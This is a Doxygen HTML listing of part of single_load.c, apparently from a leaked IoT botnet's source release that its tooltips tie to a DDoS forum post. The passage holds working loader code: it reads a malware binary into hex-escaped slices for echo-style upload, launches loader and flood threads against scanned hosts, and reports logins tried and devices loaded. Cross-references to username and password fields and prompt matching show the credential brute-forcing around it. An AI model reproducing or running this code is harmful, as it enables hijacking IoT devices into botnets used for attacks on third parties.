class="line"><a name="l00888"></a><span class="lineno">  888</span>&#160;{</div><div class="line"><a name="l00889"></a><span class="lineno">  889</span>&#160;    <span class="comment">// /proc/self/exe still works even when we delete ourselves l0l</span></div><div class="line"><a name="l00890"></a><span class="lineno">  890</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, size = 0, got = 0, i, slice = 0;</div><div class="line"><a name="l00891"></a><span class="lineno">  891</span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> ch;</div><div class="line"><a name="l00892"></a><span class="lineno">  892</span>&#160;    </div><div class="line"><a name="l00893"></a><span class="lineno">  893</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#a8854c2a82db965759bd6095a666ffb76">open</a>(path, O_RDONLY)) == -1)</div><div class="line"><a name="l00894"></a><span class="lineno">  894</span>&#160;        <span class="keywordflow">return</span> -1;</div><div class="line"><a name="l00895"></a><span class="lineno">  895</span>&#160;    <span class="keywordflow">while</span> ((got = <a class="code" href="wget_8c.html#a68dc4fd7189d34e2052e25ada13f89e0">read</a>(fd, &amp;ch, 1)) &gt; 0) size++;</div><div class="line"><a name="l00896"></a><span class="lineno">  896</span>&#160;    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00897"></a><span class="lineno">  897</span>&#160;    </div><div class="line"><a name="l00898"></a><span class="lineno">  898</span>&#160;    <a class="code" href="structbinary.html">binary</a>.num_slices = ceil(size / (<span class="keywordtype">float</span>)<a class="code" href="single__load_8c.html#aba6226c3e69f3896f4c1749d4b21c157">BYTES_PER_LINE</a>);</div><div class="line"><a name="l00899"></a><span class="lineno">  899</span>&#160;    <a class="code" href="structbinary.html">binary</a>.slices = calloc(<a class="code" href="structbinary.html">binary</a>.num_slices, <span class="keyword">sizeof</span>(<span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> *));</div><div class="line"><a name="l00900"></a><span class="lineno">  900</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="structbinary.html">binary</a>.slices == NULL)</div><div class="line"><a name="l00901"></a><span class="lineno">  901</span>&#160;        <span class="keywordflow">return</span> -1;</div><div class="line"><a name="l00902"></a><span class="lineno">  902</span>&#160;        </div><div class="line"><a name="l00903"></a><span class="lineno">  903</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="structbinary.html">binary</a>.num_slices; i++)</div><div class="line"><a name="l00904"></a><span class="lineno">  904</span>&#160;    {</div><div class="line"><a name="l00905"></a><span class="lineno">  905</span>&#160;        <a class="code" href="structbinary.html">binary</a>.slices[i] = calloc(1, <a class="code" href="single__load_8c.html#a012fc0d9c1397d1166fad67f36216256">MAX_SLICE_LENGTH</a> + 1);</div><div class="line"><a name="l00906"></a><span class="lineno">  906</span>&#160;        <span class="keywordflow">if</span> (<a class="code" href="structbinary.html">binary</a>.slices[i] == NULL)</div><div class="line"><a name="l00907"></a><span class="lineno">  907</span>&#160;            <span class="keywordflow">return</span> -1;</div><div class="line"><a name="l00908"></a><span class="lineno">  908</span>&#160;    }</div><div class="line"><a name="l00909"></a><span class="lineno">  909</span>&#160;    </div><div class="line"><a name="l00910"></a><span class="lineno">  910</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#a8854c2a82db965759bd6095a666ffb76">open</a>(path, O_RDONLY)) == -1)</div><div class="line"><a name="l00911"></a><span class="lineno">  911</span>&#160;        <span class="keywordflow">return</span> -1;</div><div class="line"><a name="l00912"></a><span class="lineno">  912</span>&#160;    <span class="keywordflow">do</span></div><div class="line"><a name="l00913"></a><span class="lineno">  913</span>&#160;    {</div><div class="line"><a name="l00914"></a><span class="lineno">  914</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="single__load_8c.html#aba6226c3e69f3896f4c1749d4b21c157">BYTES_PER_LINE</a>; i++)</div><div class="line"><a name="l00915"></a><span class="lineno">  915</span>&#160;        {</div><div class="line"><a name="l00916"></a><span class="lineno">  916</span>&#160;            got = <a class="code" href="wget_8c.html#a68dc4fd7189d34e2052e25ada13f89e0">read</a>(fd, &amp;ch, 1);</div><div class="line"><a name="l00917"></a><span class="lineno">  917</span>&#160;            <span class="keywordflow">if</span> (got != 1) <span class="keywordflow">break</span>;</div><div class="line"><a name="l00918"></a><span class="lineno">  918</span>&#160;            </div><div class="line"><a name="l00919"></a><span class="lineno">  919</span>&#160;            sprintf(<a class="code" href="structbinary.html">binary</a>.slices[slice] + strlen(<a class="code" href="structbinary.html">binary</a>.slices[slice]), <span class="stringliteral">&quot;\\\\x%02X&quot;</span>, ch);</div><div class="line"><a name="l00920"></a><span class="lineno">  920</span>&#160;        }</div><div class="line"><a name="l00921"></a><span class="lineno">  921</span>&#160;        </div><div class="line"><a name="l00922"></a><span class="lineno">  922</span>&#160;        slice++;</div><div class="line"><a name="l00923"></a><span class="lineno">  923</span>&#160;    } <span class="keywordflow">while</span>(got &gt; 0);</div><div class="line"><a name="l00924"></a><span class="lineno">  924</span>&#160;    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00925"></a><span class="lineno">  925</span>&#160;    </div><div class="line"><a name="l00926"></a><span class="lineno">  926</span>&#160;    <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00927"></a><span class="lineno">  927</span>&#160;}</div><div class="line"><a name="l00928"></a><span class="lineno">  928</span>&#160;</div><div class="line"><a name="l00929"></a><span class="lineno"><a class="line" href="single__load_8c.html#a0ddf1224851353fc92bfbff6f499fa97">  929</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a0ddf1224851353fc92bfbff6f499fa97">main</a>(<span class="keywordtype">int</span> argc, <span class="keywordtype">char</span> *argv[ ])</div><div class="line"><a name="l00930"></a><span class="lineno">  930</span>&#160;{</div><div class="line"><a name="l00931"></a><span class="lineno">  931</span>&#160;    <span class="keywordflow">if</span>(argc &lt; 4){</div><div class="line"><a name="l00932"></a><span class="lineno">  932</span>&#160;        fprintf(stderr, <span class="stringliteral">&quot;Invalid parameters!\n&quot;</span>);</div><div class="line"><a name="l00933"></a><span class="lineno">  933</span>&#160;        fprintf(stdout, <span class="stringliteral">&quot;Usage: %s &lt;bind ip&gt; &lt;input file&gt; &lt;file_to_load&gt; &lt;argument&gt; &lt;threads&gt; &lt;connections&gt; (debug mode)\n&quot;</span>, argv[0]);</div><div class="line"><a name="l00934"></a><span class="lineno">  934</span>&#160;        exit(-1);</div><div class="line"><a name="l00935"></a><span class="lineno">  935</span>&#160;    }</div><div class="line"><a name="l00936"></a><span class="lineno">  936</span>&#160;    </div><div class="line"><a name="l00937"></a><span class="lineno">  937</span>&#160;    signal(SIGPIPE, SIG_IGN);</div><div class="line"><a name="l00938"></a><span class="lineno">  938</span>&#160;    </div><div class="line"><a name="l00939"></a><span class="lineno">  939</span>&#160;    <a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a> = epoll_create(0xDEAD);</div><div class="line"><a name="l00940"></a><span class="lineno">  940</span>&#160;    <a class="code" href="single__load_8c.html#a40ea84f37bdd97a9380f0b0689cb9f6f">bind_ip</a> = argv[1];</div><div class="line"><a name="l00941"></a><span class="lineno">  941</span>&#160;    <a class="code" href="single__load_8c.html#ac891ccd192d22a97ec092f7d888237ab">infd</a> = fopen(argv[2], <span class="stringliteral">&quot;r&quot;</span>);</div><div class="line"><a name="l00942"></a><span class="lineno">  942</span>&#160;    signal(SIGINT, &amp;<a class="code" href="single__load_8c.html#abd382ad3c8079e6bd94332234d24f5a0">sighandler</a>);</div><div class="line"><a name="l00943"></a><span class="lineno">  943</span>&#160;    <span class="keywordtype">int</span> threads = atoi(argv[5]);</div><div class="line"><a name="l00944"></a><span class="lineno">  944</span>&#160;    <a class="code" href="single__load_8c.html#a777a368ac9880f35191fd558c620c1ea">maxConnectedSockets</a> = atoi(argv[6]);</div><div class="line"><a name="l00945"></a><span class="lineno">  945</span>&#160;    </div><div class="line"><a name="l00946"></a><span class="lineno">  946</span>&#160;    <span class="keywordflow">if</span> (argc == 8)</div><div class="line"><a name="l00947"></a><span class="lineno">  947</span>&#160;        <a class="code" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a> = 1;</div><div class="line"><a name="l00948"></a><span class="lineno">  948</span>&#160;    </div><div class="line"><a name="l00949"></a><span class="lineno">  949</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00950"></a><span class="lineno">  950</span>&#160;    <span class="keywordflow">for</span>(i = 0; i &lt; (1024 * 100); i++)</div><div class="line"><a name="l00951"></a><span class="lineno">  951</span>&#160;    {</div><div class="line"><a name="l00952"></a><span class="lineno">  952</span>&#160;        pthread_mutex_init(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[i].<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>, NULL);</div><div class="line"><a name="l00953"></a><span class="lineno">  953</span>&#160;    }</div><div class="line"><a name="l00954"></a><span class="lineno">  954</span>&#160;</div><div class="line"><a name="l00955"></a><span class="lineno">  955</span>&#160;    <a class="code" href="single__load_8c.html#a1ddc36888fe0a695203e39b20b1f5b2c">load_binary</a>(argv[3]);</div><div class="line"><a name="l00956"></a><span class="lineno">  956</span>&#160;    <a class="code" href="single__load_8c.html#a3ade46bb9591205f4fa0b1daf0641f84">run_arg</a> = argv[4];</div><div class="line"><a name="l00957"></a><span class="lineno">  957</span>&#160;</div><div class="line"><a name="l00958"></a><span class="lineno">  958</span>&#160;    pthread_t thread;</div><div class="line"><a name="l00959"></a><span class="lineno">  959</span>&#160;    pthread_create( &amp;thread, NULL, &amp;<a class="code" href="single__load_8c.html#a73904daa97a0de0ca1ae5f82b172cf90">loader</a>, (<span class="keywordtype">void</span> *) &amp;threads);</div><div class="line"><a name="l00960"></a><span class="lineno">  960</span>&#160;</div><div class="line"><a name="l00961"></a><span class="lineno">  961</span>&#160;    <span class="keywordflow">for</span>(i = 0; i &lt; threads; i++) pthread_create( &amp;thread, NULL, &amp;<a class="code" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a>, (<span class="keywordtype">void</span> *) NULL);</div><div class="line"><a name="l00962"></a><span class="lineno">  962</span>&#160;</div><div class="line"><a name="l00963"></a><span class="lineno">  963</span>&#160;    <span class="keywordtype">char</span> timeText[100];</div><div class="line"><a name="l00964"></a><span class="lineno">  964</span>&#160;    time_t <a class="code" href="ForumPost_8txt.html#afbfd795d2d1dd2d3b2b14084a4f022ba">now</a> = time(NULL);</div><div class="line"><a name="l00965"></a><span class="lineno">  965</span>&#160;    <span class="keyword">struct </span>tm *t = localtime(&amp;now);</div><div class="line"><a name="l00966"></a><span class="lineno">  966</span>&#160;    strftime(timeText, <span class="keyword">sizeof</span>(timeText)-1, <span class="stringliteral">&quot;%d %b %Y %l:%M %p %Z&quot;</span>, t);</div><div class="line"><a name="l00967"></a><span class="lineno">  967</span>&#160;</div><div class="line"><a name="l00968"></a><span class="lineno">  968</span>&#160;    printf(<span class="stringliteral">&quot;Starting Scan at %s\n&quot;</span>, timeText);</div><div class="line"><a name="l00969"></a><span class="lineno">  969</span>&#160;    <span class="keywordtype">char</span> temp[17] = {0};</div><div class="line"><a name="l00970"></a><span class="lineno">  970</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00971"></a><span class="lineno">  971</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;Loaded&quot;</span>);</div><div class="line"><a name="l00972"></a><span class="lineno">  972</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00973"></a><span class="lineno">  973</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00974"></a><span class="lineno">  974</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;State Timeout&quot;</span>);</div><div class="line"><a name="l00975"></a><span class="lineno">  975</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00976"></a><span class="lineno">  976</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00977"></a><span class="lineno">  977</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;No Connect&quot;</span>);</div><div class="line"><a name="l00978"></a><span class="lineno">  978</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00979"></a><span class="lineno">  979</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00980"></a><span class="lineno">  980</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;Closed Us&quot;</span>);</div><div class="line"><a name="l00981"></a><span class="lineno">  981</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00982"></a><span class="lineno">  982</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00983"></a><span class="lineno">  983</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;Logins Tried&quot;</span>);</div><div class="line"><a name="l00984"></a><span class="lineno">  984</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00985"></a><span class="lineno">  985</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00986"></a><span class="lineno">  986</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;B/s&quot;</span>);</div><div class="line"><a name="l00987"></a><span class="lineno">  987</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00988"></a><span class="lineno">  988</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00989"></a><span class="lineno">  989</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;Connected&quot;</span>);</div><div class="line"><a name="l00990"></a><span class="lineno">  990</span>&#160;    printf(<span class="stringliteral">&quot;%-16s&quot;</span>, temp);</div><div class="line"><a name="l00991"></a><span class="lineno">  991</span>&#160;    memset(temp, 0, 17);</div><div class="line"><a name="l00992"></a><span class="lineno">  992</span>&#160;    sprintf(temp, <span class="stringliteral">&quot;Running Thrds&quot;</span>);</div><div class="line"><a name="l00993"></a><span class="lineno">  993</span>&#160;    printf(<span class="stringliteral">&quot;%s&quot;</span>, temp);</div><div class="line"><a name="l00994"></a><span class="lineno">  994</span>&#160;    printf(<span class="stringliteral">&quot;\n&quot;</span>);</div><div class="line"><a name="l00995"></a><span class="lineno">  995</span>&#160;</div><div class="line"><a name="l00996"></a><span class="lineno">  996</span>&#160;    sleep(1);</div><div class="line"><a name="l00997"></a><span class="lineno">  997</span>&#160;</div><div class="line"><a name="l00998"></a><span class="lineno">  998</span>&#160;    <span class="keywordtype">char</span> *<span class="keyword">new</span>;</div><div class="line"><a name="l00999"></a><span class="lineno">  999</span>&#160;    <span class="keyword">new</span> = (<span class="keywordtype">char</span> *)malloc(16*6);</div><div class="line"><a name="l01000"></a><span class="lineno"> 1000</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a> ? 1 : <a class="code" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a> &gt; 0)</div><div class="line"><a name="l01001"></a><span class="lineno"> 1001</span>&#160;    {</div><div class="line"><a name="l01002"></a><span class="lineno"> 1002</span>&#160;        printf(<span class="stringliteral">&quot;\r&quot;</span>);</div><div class="line"><a name="l01003"></a><span class="lineno"> 1003</span>&#160;        memset(<span class="keyword">new</span>, <span class="charliteral">&#39;\0&#39;</span>, 16*6);</div><div class="line"><a name="l01004"></a><span class="lineno"> 1004</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#ade3fd107ea730977ea13ae06f11a466a">found_srvs</a>);</div><div class="line"><a name="l01005"></a><span class="lineno"> 1005</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#a9ae97c4e98713a8e03d2dc33d07248d5">timed_out</a>);</div><div class="line"><a name="l01006"></a><span class="lineno"> 1006</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#afa54e717c52681c4ee6722efed32e67f">failed_connect</a>);</div><div class="line"><a name="l01007"></a><span class="lineno"> 1007</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#a132912f867b9c79296731cc953db0e0d">remote_hangup</a>);</div><div class="line"><a name="l01008"></a><span class="lineno"> 1008</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#a9f642299723fd19fc3fb895d2709ea79">login_done</a>);</div><div class="line"><a name="l01009"></a><span class="lineno"> 1009</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15d&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">bytes_sent</a>);</div><div class="line"><a name="l01010"></a><span class="lineno"> 1010</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15lu&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#a25b6b0d5a233ac0249fe798020e9d86a">getConnectedSockets</a>());</div><div class="line"><a name="l01011"></a><span class="lineno"> 1011</span>&#160;        sprintf(<span class="keyword">new</span>, <span class="stringliteral">&quot;%s|%-15d&quot;</span>, <span class="keyword">new</span>, <a class="code" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a>);</div><div class="line"><a name="l01012"></a><span class="lineno"> 1012</span>&#160;        printf(<span class="stringliteral">&quot;%s&quot;</span>, <span class="keyword">new</span>);</div><div class="line"><a name="l01013"></a><span class="lineno"> 1013</span>&#160;        fflush(stdout);</div><div class="line"><a name="l01014"></a><span class="lineno"> 1014</span>&#160;        <a class="code" href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">bytes_sent</a>=0;</div><div class="line"><a name="l01015"></a><span class="lineno"> 1015</span>&#160;        sleep(1);</div><div class="line"><a name="l01016"></a><span class="lineno"> 1016</span>&#160;    }</div><div class="line"><a name="l01017"></a><span class="lineno"> 1017</span>&#160;    printf(<span class="stringliteral">&quot;\n&quot;</span>);</div><div class="line"><a name="l01018"></a><span class="lineno"> 1018</span>&#160;</div><div class="line"><a name="l01019"></a><span class="lineno"> 1019</span>&#160;    now = time(NULL);</div><div class="line"><a name="l01020"></a><span class="lineno"> 1020</span>&#160;    t = localtime(&amp;now);</div><div class="line"><a name="l01021"></a><span class="lineno"> 1021</span>&#160;    strftime(timeText, <span class="keyword">sizeof</span>(timeText)-1, <span class="stringliteral">&quot;%d %b %Y %l:%M %p %Z&quot;</span>, t);</div><div class="line"><a name="l01022"></a><span class="lineno"> 1022</span>&#160;    printf(<span class="stringliteral">&quot;Scan finished at %s\n&quot;</span>, timeText);</div><div class="line"><a name="l01023"></a><span class="lineno"> 1023</span>&#160;    <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l01024"></a><span class="lineno"> 1024</span>&#160;}</div><div class="ttc" id="ForumPost_8txt_html_afbfd795d2d1dd2d3b2b14084a4f022ba"><div class="ttname"><a href="ForumPost_8txt.html#afbfd795d2d1dd2d3b2b14084a4f022ba">now</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT now</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="single__load_8c_html_ae9c69edc71ec3e55ed54dfe5ec400b3b"><div class="ttname"><a href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">bytes_sent</a></div><div class="ttdeci">volatile unsigned int bytes_sent</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00044">single_load.c:44</a></div></div>
<div class="ttc" id="single__load_8c_html_af831315881831b845a3bc22693da57a3"><div class="ttname"><a href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a></div><div class="ttdeci">static int epollFD</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00054">single_load.c:54</a></div></div>
<div class="ttc" id="single__load_8c_html_af1bddd272ab58d596235a98a58df8c46"><div class="ttname"><a href="single__load_8c.html#af1bddd272ab58d596235a98a58df8c46">hexDump</a></div><div class="ttdeci">void hexDump(char *desc, void *addr, int len)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00141">single_load.c:141</a></div></div>
<div class="ttc" id="structstateSlot__t_html_ab4d619ac04c7c52d3acc5872d8e46d18"><div class="ttname"><a href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">stateSlot_t::pathInd</a></div><div class="ttdeci">uint8_t pathInd</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00067">single_load.c:67</a></div></div>
<div class="ttc" id="single__load_8c_html_acbdcadfc9f254fc3f06dc6ed0d39c3c6"><div class="ttname"><a href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a></div><div class="ttdeci">volatile int running_threads</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00042">single_load.c:42</a></div></div>
<div class="ttc" id="single__load_8c_html_ab3224925b39807938f827a0562819482"><div class="ttname"><a href="single__load_8c.html#ab3224925b39807938f827a0562819482">num_slices</a></div><div class="ttdeci">int num_slices</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00087">single_load.c:87</a></div></div>
<div class="ttc" id="single__load_8c_html_abd382ad3c8079e6bd94332234d24f5a0"><div class="ttname"><a href="single__load_8c.html#abd382ad3c8079e6bd94332234d24f5a0">sighandler</a></div><div class="ttdeci">void sighandler(int sig)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00748">single_load.c:748</a></div></div>
<div class="ttc" id="single__load_8c_html_a9e3a1d6d9c69a0538ce2947564ea65a7"><div class="ttname"><a href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a></div><div class="ttdeci">int sockprintf(int sock, char *formatStr,...)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00206">single_load.c:206</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a77d151d0f9c4e016ba16d3444e0d3553"><div class="ttname"><a href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">stateSlot_t::username</a></div><div class="ttdeci">char username[32]</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00081">single_load.c:81</a></div></div>
<div class="ttc" id="single__load_8c_html_a3b804bc1e71e873697dea65f8bd95523"><div class="ttname"><a href="single__load_8c.html#a3b804bc1e71e873697dea65f8bd95523">handle_found</a></div><div class="ttdeci">void handle_found(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00255">single_load.c:255</a></div></div>
<div class="ttc" id="single__load_8c_html_a777a368ac9880f35191fd558c620c1ea"><div class="ttname"><a href="single__load_8c.html#a777a368ac9880f35191fd558c620c1ea">maxConnectedSockets</a></div><div class="ttdeci">static int maxConnectedSockets</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00036">single_load.c:36</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a4e5442d9c3efde0f37f2177e33dccac9"><div class="ttname"><a href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">stateSlot_t::state</a></div><div class="ttdeci">unsigned char state</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00078">single_load.c:78</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a663b34074eb9f5b50b34379824d6b58e"><div class="ttname"><a href="structstateSlot__t.html#a663b34074eb9f5b50b34379824d6b58e">stateSlot_t::ip</a></div><div class="ttdeci">uint32_t ip</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00072">single_load.c:72</a></div></div>
<div class="ttc" id="single__load_8c_html_ac962089ec347c5f622ead313b02c802d"><div class="ttname"><a href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a></div><div class="ttdeci">int log_recv(int sock, void *buf, int len, int flags)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00166">single_load.c:166</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a41ba546ff5566fb42a81bf13f15476c9"><div class="ttname"><a href="structstateSlot__t.html#a41ba546ff5566fb42a81bf13f15476c9">stateSlot_t::reconnecting</a></div><div class="ttdeci">int reconnecting</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00076">single_load.c:76</a></div></div>
<div class="ttc" id="wget_8c_html_a8854c2a82db965759bd6095a666ffb76"><div class="ttname"><a href="wget_8c.html#a8854c2a82db965759bd6095a666ffb76">open</a></div><div class="ttdeci">#define open</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00051">wget.c:51</a></div></div>
<div class="ttc" id="single__load_8c_html_af5f21519b5c3a467090f9d34153880ed"><div class="ttname"><a href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a></div><div class="ttdeci">int matchPrompt(char *bufStr)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00100">single_load.c:100</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a04cd8d776257013858dce1f54c7a0d74"><div class="ttname"><a href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">stateSlot_t::password</a></div><div class="ttdeci">char password[32]</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00082">single_load.c:82</a></div></div>
<div class="ttc" id="single__load_8c_html_a1ddc36888fe0a695203e39b20b1f5b2c"><div class="ttname"><a href="single__load_8c.html#a1ddc36888fe0a695203e39b20b1f5b2c">load_binary</a></div><div class="ttdeci">int load_binary(char *path)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00887">single_load.c:887</a></div></div>
<div class="ttc" id="structstateSlot__t_html_ad53d5380e8c4e25db6de2ae2f356158a"><div class="ttname"><a href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">stateSlot_t::mutex</a></div><div class="ttdeci">pthread_mutex_t mutex</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00060">single_load.c:60</a></div></div>
<div class="ttc" id="single__load_8c_html_a412161fb153a2b9a2b6b287baa1b0971"><div class="ttname"><a href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a></div><div class="ttdeci">void * flood(void *par1)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00334">single_load.c:334</a></div></div>
<div class="ttc" id="single__load_8c_html_a9f642299723fd19fc3fb895d2709ea79"><div class="ttname"><a href="single__load_8c.html#a9f642299723fd19fc3fb895d2709ea79">login_done</a></div><div class="ttdeci">volatile unsigned long login_done</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00046">single_load.c:46</a></div></div>
<div class="ttc" id="single__load_8c_html_a8da4fb95d90c2d188241f358748ff05c"><div class="ttname"><a href="single__load_8c.html#a8da4fb95d90c2d188241f358748ff05c">bin_port</a></div><div class="ttdeci">static unsigned short bin_port</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00039">single_load.c:39</a></div></div>
<div class="ttc" id="single__load_8c_html_adb74e74784f00b371ac2b6174ee15593"><div class="ttname"><a href="single__load_8c.html#adb74e74784f00b371ac2b6174ee15593">handle_timeout</a></div><div class="ttdeci">void handle_timeout(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00245">single_load.c:245</a></div></div>
<div class="ttc" id="single__load_8c_html_a4225ca72f2fd6918ee211c80bbeb4799"><div class="ttname"><a href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a></div><div class="ttdeci">static unsigned char debug_mode</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00035">single_load.c:35</a></div></div>
